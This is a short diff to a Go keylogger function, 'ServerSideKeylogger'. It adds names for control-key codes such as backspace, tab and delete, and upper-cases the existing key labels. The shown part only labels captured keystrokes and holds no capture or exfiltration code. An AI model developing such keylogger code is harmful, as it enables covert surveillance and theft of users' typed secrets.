@@ -36,12 +36,24 @@ func ServerSideKeylogger() {
 			keystroke := string(k.Keychar)
 
 			switch k.Keychar {
+			case 8:
+				keystroke = "BACKSPACE"
+			case 9:
+				keystroke = "HORIZONTAL TAB"
+			case 11:
+				keystroke = "VERTICAL TAB"
 			case 13:
-				keystroke = "Return(Enter)"
+				keystroke = "RETURN(ENTER)"
+			case 14:
+				keystroke = "SHIFT OUT"
+			case 15:
+				keystroke = "SHIFT IN"
 			case 32:
-				keystroke = "Space"
+				keystroke = "SPACE"
 			case 27:
-				keystroke = "Escape"
+				keystroke = "ESCAPE"
+			case 127:
+				keystroke = "DELETE"
 			}
 
 			//fmt.Printf("Pressing: %s\n", keystroke)
